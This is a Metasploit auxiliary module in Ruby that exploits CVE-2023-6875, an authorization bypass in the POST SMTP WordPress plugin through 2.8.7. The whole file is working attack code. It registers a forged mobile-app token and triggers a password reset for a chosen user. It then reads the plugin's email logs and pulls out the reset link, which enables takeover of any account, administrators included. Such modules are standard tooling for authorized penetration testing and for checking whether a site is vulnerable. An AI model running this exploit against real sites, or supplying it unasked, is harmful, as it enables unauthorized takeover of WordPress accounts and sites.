##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Wordpress POST SMTP Account Takeover',
        'Description' => %q{
          The POST SMTP WordPress plugin through 2.8.7 is affected by a privilege
          escalation where an unauthenticated user is able to reset the password
          of an arbitrary user. This is done by requesting a password reset, then
          viewing the latest email logs to find the associated password reset email.
          Version 2.8.8 fixes the authorization bypass. Registering the mobile
          token replaces existing connected-device settings and the server URL;
          the module cannot restore those prior values.
        },
        'Author' => [
          'h00die', # msf module
          'Ulysses Saicha', # Discovery, POC
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2023-6875'],
          ['URL', 'https://www.wordfence.com/blog/2024/01/type-juggling-leads-to-two-vulnerabilities-in-post-smtp-mailer-wordpress-plugin/'],
          ['URL', 'https://github.com/UlyssesSaicha/CVE-2023-6875/tree/main'],
        ],
        'DisclosureDate' => '2024-01-10',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES],
          'Reliability' => []
        }
      )
    )
    register_options(
      [
        OptString.new('USERNAME', [true, 'Username to password reset', '']),
      ]
    )
  end

  def register_token
    token = Rex::Text.rand_text_alphanumeric(10..16)
    device = Rex::Text.rand_text_alphanumeric(10..16)
    vprint_status("Attempting to Registering token #{token} on device #{device}")

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'wp-json', 'post-smtp', 'v1', 'connect-app'),
      'headers' => { 'fcm-token' => token, 'device' => device }
    )
    fail_with(Failure::Unreachable, 'Mobile-device registration did not receive a response') unless res
    fail_with(Failure::NoAccess, "Mobile-device registration was denied (HTTP #{res.code})") if [401, 403].include?(res.code)
    fail_with(Failure::UnexpectedReply, "Mobile-device registration returned HTTP #{res.code}") unless res.code == 200

    json_doc = res.get_json_document
    if json_doc.is_a?(Hash) && json_doc['success'] == false
      fail_with(Failure::NoAccess, 'POST SMTP rejected mobile-device registration; the target may be patched or require authorization')
    end
    unless json_doc.is_a?(Hash) && json_doc['success'] == true && json_doc['data'].is_a?(Hash) && json_doc['data']['fcm_token'] == token
      fail_with(Failure::UnexpectedReply, 'Mobile-device registration did not confirm the requested token')
    end
    print_good("Successfully created token: #{token}")
    return token, device
  end

  def check
    unless wordpress_and_online?
      return Msf::Exploit::CheckCode::Safe('Server not online or not detected as wordpress')
    end

    checkcode = check_plugin_version_from_readme('post-smtp', '2.8.8')
    if checkcode == Msf::Exploit::CheckCode::Safe
      return Msf::Exploit::CheckCode::Safe('POST SMTP version not vulnerable')
    end

    checkcode
  rescue OpenSSL::SSL::SSLError => e
    elog('TLS negotiation failed while checking POST SMTP', error: e)
    Msf::Exploit::CheckCode::Unknown('TLS negotiation failed while checking POST SMTP')
  end

  def run
    fail_with(Failure::NotFound, "#{datastore['USERNAME']} not found on this wordpress install") unless wordpress_user_exists? datastore['USERNAME']
    token, device = register_token
    fail_with(Failure::UnexpectedReply, "Password reset for #{datastore['USERNAME']} failed") unless reset_user_password(datastore['USERNAME'])
    print_status('Requesting logs')
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'wp-json', 'post-smtp', 'v1', 'get-logs'),
      'headers' => { 'fcm-token' => token, 'device' => device }
    )
    fail_with(Failure::Unreachable, 'Email-log request did not receive a response') unless res
    fail_with(Failure::NoAccess, "Email-log request was denied (HTTP #{res.code})") if [401, 403].include?(res.code)
    fail_with(Failure::UnexpectedReply, "Email-log request returned HTTP #{res.code}") unless res.code == 200
    json_doc = res.get_json_document
    if json_doc.is_a?(Hash) && json_doc['success'] == false
      fail_with(Failure::NoAccess, 'POST SMTP rejected access to the email logs')
    end
    unless json_doc.is_a?(Hash) && json_doc['success'] == true && json_doc['data'].is_a?(Array)
      fail_with(Failure::UnexpectedReply, 'Email-log response did not contain a log list')
    end
    fail_with(Failure::NotFound, 'No email logs are available; check POST SMTP email logging and delivery') if json_doc['data'].empty?

    # The API orders mail by descending time; the requested reset should be latest.
    entry = json_doc['data'].first
    unless entry.is_a?(Hash) && entry['id'].to_s.match?(/\A[1-9]\d*\z/)
      fail_with(Failure::UnexpectedReply, 'Latest email log did not contain a valid ID')
    end
    doc_id = entry['id']
    print_status("Requesting email content from logs for ID #{doc_id}")
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin.php'),
      'headers' => { 'fcm-token' => token, 'device' => device },
      'vars_get' => { 'access_token' => token, 'type' => 'log', 'log_id' => doc_id }
    )
    fail_with(Failure::Unreachable, 'Email-content request did not receive a response') unless res
    fail_with(Failure::NoAccess, "Email-content request was denied (HTTP #{res.code})") if [401, 403].include?(res.code)
    fail_with(Failure::UnexpectedReply, "Email-content request returned HTTP #{res.code}") unless res.code == 200

    path = store_loot(
      'wordpress.post_smtp.log',
      'text/plain',
      rhost,
      res.body,
      "#{doc_id}.log"
    )
    print_good("Full text of log saved to: #{path}")
    # https://rubular.com/r/DDQpKElcH42Qxg
    # example URL http://127.0.0.1:5555/wp-login.php?action=rp&key=vy0MNNZZeykpDMArmJgu&login=admin&wp_lang=en_US
    if res.body =~ /^(.*key=.+)$/
      print_good("Reset URL: #{::Regexp.last_match(1)}")
      return
    end
    fail_with(Failure::NotFound, 'Password reset URL was not found; review the email log saved in loot')
  rescue OpenSSL::SSL::SSLError => e
    elog('TLS negotiation failed during POST SMTP account takeover', error: e)
    fail_with(Failure::Unreachable, 'TLS negotiation failed during POST SMTP account takeover')
  end
end
